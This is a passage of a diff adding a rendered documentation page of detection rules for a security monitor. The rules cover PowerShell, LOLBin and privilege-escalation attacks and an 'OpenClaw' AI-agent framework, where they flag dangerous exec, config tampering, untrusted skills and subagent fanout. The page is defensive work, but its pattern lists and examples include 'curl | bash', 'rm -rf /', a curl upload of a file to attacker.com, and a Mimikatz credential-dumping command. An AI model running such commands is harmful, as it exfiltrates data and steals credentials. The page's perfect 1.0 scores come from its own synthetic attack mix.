+<p><strong>Remediation:</strong> Isolate affected systems, review SMB logs</p>
+<hr />
+<h3 id="rule-005-powershell-abuse-t1059001">RULE-005: PowerShell Abuse (T1059.001)</h3>
+<p><strong>Attack:</strong> Dangerous PowerShell commands</p>
+<p><strong>Pattern:</strong> Obfuscated PowerShell, Invoke-Webrequest chains, hidden windows</p>
+<p><strong>Alert When:</strong></p>
+<ul>
+<li>Encoded/obfuscated PowerShell scripts</li>
+<li>Reflective DLL injection patterns</li>
+<li>Script download &amp; execute chains</li>
+</ul>
+<p><strong>Severity:</strong> <code>HIGH</code></p>
+<p><strong>Remediation:</strong> Block PowerShell or constrain App-Locker policies</p>
+<hr />
+<h3 id="rule-006-privilege-escalation-t1068">RULE-006: Privilege Escalation (T1068)</h3>
+<p><strong>Attack:</strong> Attempt to gain elevated privileges</p>
+<p><strong>Pattern:</strong> sudo/UAC bypass, kernel exploit, privilege squashing</p>
+<p><strong>Alert When:</strong></p>
+<ul>
+<li>Failed privilege escalation attempts</li>
+<li>Known CVE exploit patterns</li>
+<li>Unauthorized root command execution</li>
+</ul>
+<p><strong>Severity:</strong> <code>CRITICAL</code></p>
+<p><strong>Remediation:</strong> Apply patches, monitor PAM logs, enable UAC</p>
+<hr />
+<h3 id="rule-007-fileless-lolbins-t1218">RULE-007: Fileless LOLBins (T1218)</h3>
+<p><strong>Attack:</strong> Living-off-the-land binary abuse</p>
+<p><strong>Pattern:</strong> Legitimate OS binaries used maliciously (certutil, mshta, regsvcs)</p>
+<p><strong>Alert When:</strong></p>
+<ul>
+<li>LOLBin command execution with suspicious arguments</li>
+<li>Downloading files via certutil/mshta</li>
+<li>Registry manipulation via reg.exe</li>
+</ul>
+<p><strong>Severity:</strong> <code>HIGH</code></p>
+<p><strong>Remediation:</strong> Application whitelisting, behavior-based prevention</p>
+<hr />
+<h2 id="openclaw-rules-rule-101-to-rule-110">OpenClaw Rules (RULE-101 to RULE-110)</h2>
+<p>These rules detect attacks specific to the OpenClaw agent framework.</p>
+<h3 id="rule-101-dangerous-exec-t1059">RULE-101: Dangerous Exec (T1059)</h3>
+<p><strong>Attack:</strong> Dangerous command patterns in agent execution</p>
+<p><strong>Pattern Matches:</strong></p>
+<ul>
+<li><code>curl | bash</code> — shell injection</li>
+<li><code>ssh root@[host]</code> — root access</li>
+<li><code>scp</code> to production — artifact theft</li>
+<li><code>rm -rf /</code> — destructive commands</li>
+<li>Bearer tokens in plaintext — credential exposure</li>
+</ul>
+<p><strong>Alert When:</strong></p>
+<ul>
+<li>Exec surface contains any dangerous pattern</li>
+<li>Command string matches dangerous regex</li>
+</ul>
+<p><strong>Severity:</strong> <code>CRITICAL</code></p>
+<p><strong>Remediation:</strong></p>
+<ol>
+<li>Review command authorization</li>
+<li>Check if tool was approved in agent audit log</li>
+<li>Inspect surrounding tool invocations for clues</li>
+</ol>
+<p><strong>Test:</strong></p>
+<pre><code class="language-bash">python generate_openclaw_attack_mix.py --stats  # Generates 2 dangerous_exec events
+</code></pre>
+<hr />
+<h3 id="rule-102-sensitive-config-change-t1528">RULE-102: Sensitive Config Change (T1528)</h3>
+<p><strong>Attack:</strong> Unauthorized modification of critical OpenClaw settings</p>
+<p><strong>Pattern Matches:</strong></p>
+<ul>
+<li><code>openclaw.json</code> authentication field mutation</li>
+<li><code>tools.exec</code> capability changes</li>
+<li><code>commands.restart</code> policy modification</li>
+</ul>
+<p><strong>Alert When:</strong></p>
+<ul>
+<li>Config audit surface shows mutation to protected field</li>
+<li>Tool capability changed outside normal workflow</li>
+</ul>
+<p><strong>Severity:</strong> <code>CRITICAL</code></p>
+<p><strong>Remediation:</strong></p>
+<ol>
+<li>Restore from backup</li>
+<li>Audit who has config write access</li>
+<li>Enable config signing/approval workflows</li>
+</ol>
+<p><strong>Example Detection:</strong></p>
+<pre><code class="language-json">{
+  &quot;surface&quot;: &quot;config&quot;,
+  &quot;action&quot;: &quot;write&quot;,
+  &quot;changed_paths&quot;: [&quot;openclaw.json:.auth&quot;],
+  &quot;timestamp&quot;: &quot;2026-03-15T14:23:45Z&quot;,
+  &quot;alert&quot;: true
+}
+</code></pre>
+<hr />
+<h3 id="rule-103-skill-source-drift-t1195">RULE-103: Skill Source Drift (T1195)</h3>
+<p><strong>Attack:</strong> Installing skills from untrusted sources (supply chain risk)</p>
+<p><strong>Pattern Matches:</strong></p>
+<ul>
+<li>skill_source != "clawhub" (official repository)</li>
+<li>skill_source contains "github.com" with random username</li>
+<li>skill_source contains "random-gist" or URL-like patterns</li>
+</ul>
+<p><strong>Alert When:</strong></p>
+<ul>
+<li>Skill installed from non-Clawhub origin</li>
+<li>Source changed unexpectedly</li>
+</ul>
+<p><strong>Severity:</strong> <code>HIGH</code> (supply chain)</p>
+<p><strong>Remediation:</strong></p>
+<ol>
+<li>Review skill source and author</li>
+<li>Audit skill code for malicious patterns</li>
+<li>Remove skill or revert to Clawhub version</li>
+</ol>
+<p><strong>Why it matters:</strong> Skills have agent execution privileges; untrusted sources = arbitrary code.</p>
+<hr />
+<h3 id="rule-104-policy-denial-churn-t1078">RULE-104: Policy Denial Churn (T1078)</h3>
+<p><strong>Attack:</strong> Rapid policy denials suggesting permission brute-forcing</p>
+<p><strong>Pattern:</strong> 3+ denials of same denial type in under 10 minutes</p>
+<p><strong>Examples:</strong></p>
+<ul>
+<li>3+ denied ssh attempts → blocked by policy</li>
+<li>3+ denied tool execution → insufficient capability</li>
+<li>3+ denied config edits → insufficient auth level</li>
+</ul>
+<p><strong>Alert When:</strong></p>
+<ul>
+<li>Denial churn window triggers</li>
+<li>Multiple related denials cluster in time</li>
+</ul>
+<p><strong>Severity:</strong> <code>MEDIUM</code> (reconnaissance)</p>
+<p><strong>Remediation:</strong></p>
+<ol>
+<li>Review what was being attempted</li>
+<li>Check if user account is compromised</li>
+<li>Require approval workflows for sensitive operations</li>
+</ol>
+<hr />
+<h3 id="rule-105-tool-burst-abuse-t1087">RULE-105: Tool Burst Abuse (T1087)</h3>
+<p><strong>Attack:</strong> Rapid tool invocation suggesting reconnaissance or enumeration</p>
+<p><strong>Pattern:</strong></p>
+<ul>
+<li>5+ tool starts in under 5 minutes</li>
+<li>Plus: 4+ unique tool types OR 3+ mutating operations</li>
+</ul>
+<p><strong>Requires Context (to avoid false positives):</strong></p>
+<ul>
+<li>severity_hint &gt;= MEDIUM OR</li>
+<li>status = "denied" OR</li>
+<li>exit_code indicating failure</li>
+</ul>
+<p><strong>Examples:</strong></p>
+<ul>
+<li>read, write, edit, exec, gateway started in sequence → 5 tools</li>
+<li>git, npm, pip all installing packages → 3 mutating</li>
+</ul>
+<p><strong>Alert When:</strong></p>
+<ul>
+<li>Burst shape detected</li>
+<li>Plus suspicious context</li>
+</ul>
+<p><strong>Severity:</strong> <code>MEDIUM</code></p>
+<p><strong>Remediation:</strong></p>
+<ol>
+<li>Review tool chain for legitimate purpose</li>
+<li>If reconnaissance, review what was discovered</li>
+<li>Restrict rapid tool access via approval workflows</li>
+</ol>
+<hr />
+<h3 id="rule-106-pairing-churn-abuse-t1078">RULE-106: Pairing Churn Abuse (T1078)</h3>
+<p><strong>Attack:</strong> Rapid pairing approval/denial cycles (authentication bypass attempts)</p>
+<p><strong>Pattern:</strong> start → deny → approve cycle in under 10 minutes</p>
+<p><strong>Why it matters:</strong> Attacker cycles approval states to test boundaries</p>
+<p><strong>Alert When:</strong></p>
+<ul>
+<li>Approval churn cycle detected</li>
+</ul>
+<p><strong>Severity:</strong> <code>MEDIUM</code></p>
+<p><strong>Remediation:</strong></p>
+<ol>
+<li>Review who is requesting pairing</li>
+<li>Check if initial requester had valid reason</li>
+<li>Increase pairing approval thresholds</li>
+</ol>
+<hr />
+<h3 id="rule-107-subagent-fanout-abuse-t1104">RULE-107: Subagent Fanout Abuse (T1104)</h3>
+<p><strong>Attack:</strong> Excessive subagent spawning (lateral movement/escalation)</p>
+<p><strong>Pattern:</strong> 3+ child subagents spawned from same requester in under 5 minutes</p>
+<p><strong>Why it matters:</strong> Creates execution parallelism, hard to audit</p>
+<p><strong>Alert When:</strong></p>
+<ul>
+<li>3+ subagent spawn events from one parent in narrow window</li>
+</ul>
+<p><strong>Severity:</strong> <code>HIGH</code></p>
+<p><strong>Remediation:</strong></p>
+<ol>
+<li>Review subagent spawn justifications</li>
+<li>Limit concurrent subagent count</li>
+<li>Require approval for multi-agent workflows</li>
+</ol>
+<hr />
+<h3 id="rule-108-restart-loop-t1529">RULE-108: Restart Loop (T1529)</h3>
+<p><strong>Attack:</strong> Rapid restart cycles causing denial of service</p>
+<p><strong>Pattern:</strong> 2+ restarts in under 5 minutes</p>
+<p><strong>Requires Context (to avoid false positives):</strong></p>
+<ul>
+<li>Policy decision = "forced" OR "deny" OR "block" OR</li>
+<li>Status = error-like (timeout, failure) OR</li>
+<li>severity_hint &gt;= MEDIUM</li>
+</ul>
+<p><strong>Why it matters:</strong> Sabotage or forced reboot loop</p>
+<p><strong>Alert When:</strong></p>
+<ul>
+<li>Restart window detected</li>
+<li>Plus suspicious context</li>
+</ul>
+<p><strong>Severity:</strong> <code>HIGH</code></p>
+<p><strong>Remediation:</strong></p>
+<ol>
+<li>Investigate why restart was forced</li>
+<li>Check for resource exhaustion</li>
+<li>Limit restart frequency via policy</li>
+</ol>
+<p><strong>Test:</strong></p>
+<pre><code class="language-bash">python generate_openclaw_attack_mix.py --stats  # Generates 2 restart_loop events
+</code></pre>
+<hr />
+<h3 id="rule-109-data-exfiltration-t1048">RULE-109: Data Exfiltration (T1048)</h3>
+<p><strong>Attack:</strong> Data staging and transfer to attacker infrastructure</p>
+<p><strong>Pattern Matches:</strong></p>
+<ul>
+<li><code>curl -F @[file]</code> — HTTP form upload</li>
+<li><code>wget --post-file</code> — HTTP post</li>
+<li><code>rclone copy|sync</code> to remote storage</li>
+<li><code>rsync</code> to remote host</li>
+<li><code>nc</code> bidirectional transfer</li>
+<li><code>tar|zip &amp;&amp; curl</code> — archive chain</li>
+<li>Keywords: "exfil", "exfiltration"</li>
+</ul>
+<p><strong>Alert When:</strong></p>
+<ul>
+<li>Any exfil pattern detected in exec surface</li>
+</ul>
+<p><strong>Severity:</strong> <code>CRITICAL</code> (data loss)</p>
+<p><strong>Remediation:</strong></p>
+<ol>
+<li>Identify exfiltration destination</li>
+<li>Disconnect host from network</li>
+<li>Preserve logs, analyze data scope</li>
+<li>Invalidate credentials if data contains secrets</li>
+</ol>
+<p><strong>Example:</strong></p>
+<pre><code class="language-bash"># Detected by RULE-109
+curl -F &quot;data=@sensitive.json&quot; https://attacker.com/upload
+</code></pre>
+<hr />
+<h3 id="rule-110-malware-presence-t1204">RULE-110: Malware Presence (T1204)</h3>
+<p><strong>Attack:</strong> Known malware tooling indicators in commands or skill sources</p>
+<p><strong>Pattern Matches:</strong></p>
+<ul>
+<li><code>mimikatz</code> — credential dumping</li>
+<li><code>cobalt strike</code> / <code>beacon</code> — C2 framework</li>
+<li><code>meterpreter</code> / <code>msfvenom</code> / <code>metasploit</code> — exploit framework</li>
+<li><code>xmrig</code> — cryptocurrency miner</li>
+<li><code>ransomware</code> / <code>encryptor</code> — ransomware families</li>
+<li><code>njrat</code>, <code>quasar</code>, <code>darkcomet</code>, <code>remcos</code> — RAT families</li>
+<li><code>Invoke-Mimikatz</code>, <code>sekurlsa::logonpasswords</code> — PowerShell patterns</li>
+</ul>
+<p><strong>Alert When:</strong></p>
+<ul>
+<li>Malware keyword or signature detected in command text or skill_source</li>
+</ul>
+<p><strong>Severity:</strong> <code>CRITICAL</code></p>
+<p><strong>Remediation:</strong></p>
+<ol>
+<li>Immediate isolation (air-gap)</li>
+<li>Capture full memory dump</li>
+<li>Retrieve command and control logs</li>
+<li>Assess what systems were accessed</li>
+</ol>
+<p><strong>Example:</strong></p>
+<pre><code class="language-json">{
+  &quot;surface&quot;: &quot;exec&quot;,
+  &quot;command&quot;: &quot;powershell Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'&quot;,
+  &quot;matched_pattern&quot;: &quot;Invoke-Mimikatz&quot;,
+  &quot;rule_id&quot;: &quot;RULE-110&quot;,
+  &quot;severity&quot;: &quot;CRITICAL&quot;
+}
+</code></pre>
+<hr />
+<h2 id="how-to-tune-rules">How to Tune Rules</h2>
+<h3 id="adjust-thresholds">Adjust Thresholds</h3>
+<p>Edit <code>detect.py</code> and modify <strong>window_minutes</strong>, <strong>threshold counts</strong>, or <strong>severity levels</strong>:</p>
+<pre><code class="language-python">def detect_openclaw_tool_burst(events: List[Dict]) -&gt; List[str]:
+    threshold = 5           # ← change required tool count
+    window_minutes = 5      # ← change time window
+    require_risky = True    # ← toggle context requirement
+</code></pre>
+<h3 id="add-new-patterns">Add New Patterns</h3>
+<p>Extend regex patterns in any rule:</p>
+<pre><code class="language-python">exfil_patterns = [
+    r&quot;(?i)curl\s+.*\s-F\s+.*@&quot;,          # existing
+    r&quot;(?i)new-object.*webclient&quot;,         # add new
+]
+</code></pre>
+<h3 id="create-new-rules">Create New Rules</h3>
+<p>Copy a template and add to <code>DETECTION_RULES</code> registry:</p>
+<pre><code class="language-python">def detect_custom_rule(events: List[Dict]) -&gt; List[str]:
+    &quot;&quot;&quot;New rule for custom attack pattern&quot;&quot;&quot;
+    findings = []
+    for event in events:
+        if suspicious_pattern(event):
+            findings.append(event[&quot;event_id&quot;])
+    return findings
+
+DETECTION_RULES = {
+    &quot;RULE-201&quot;: detect_custom_rule,  # ← register
+    ...
+}
+</code></pre>
+<h3 id="validate-changes">Validate Changes</h3>
+<pre><code class="language-bash">python generate_openclaw_attack_mix.py --stats
+python evaluate.py --labeled data/openclaw/replay/labeled/attack_mix.json --mode benchmark
+</code></pre>
+<hr />
+<h2 id="rule-effectiveness">Rule Effectiveness</h2>
+<h3 id="by-attack-type">By Attack Type</h3>
+<table>
+<thead>
+<tr>
+<th>Attack Type</th>
+<th>Covered By</th>
+<th>F1 Score</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Dangerous Exec</td>
+<td>RULE-101</td>
+<td>1.0</td>
+</tr>
+<tr>
+<td>Sensitive Config</td>
+<td>RULE-102</td>
+<td>1.0</td>
+</tr>
+<tr>
+<td>Skill Drift</td>
+<td>RULE-103</td>
+<td>1.0</td>
+</tr>
+<tr>
+<td>Policy Denial</td>
+<td>RULE-104</td>
+<td>1.0</td>
+</tr>
+<tr>
+<td>Tool Burst</td>
+<td>RULE-105</td>
+<td>1.0</td>
+</tr>
+<tr>
+<td>Pairing Churn</td>
+<td>RULE-106</td>
+<td>1.0</td>
+</tr>
+<tr>
+<td>Subagent Fanout</td>
+<td>RULE-107</td>
+<td>1.0</td>
+</tr>
+<tr>
+<td>Restart Loop</td>
+<td>RULE-108</td>
+<td>1.0</td>
+</tr>
+<tr>
+<td>Data Exfil</td>
+<td>RULE-109</td>
+<td>1.0</td>
+</tr>
+<tr>
+<td>Malware</td>
+<td>RULE-110</td>
+<td>1.0</td>
+</tr>
+</tbody>
+</table>
+<h3 id="overall">Overall</h3>
+<ul>
+<li><strong>Combined F1:</strong> 1.000000</li>
+<li><strong>Precision:</strong> 1.000000 (no false positives)</li>
+<li><strong>Recall:</strong> 1.000000 (no missed attacks)</li>
+<li><strong>FPR:</strong> 0.000000</li>
+</ul>
+<hr />
+<p><strong>Next:</strong> Review <a href="../getting-started/">Getting Started</a> or <a href="../deployment-guide/">Deploy to Production</a></p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": ["navigation.top", "navigation.instant", "search.highlight"], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
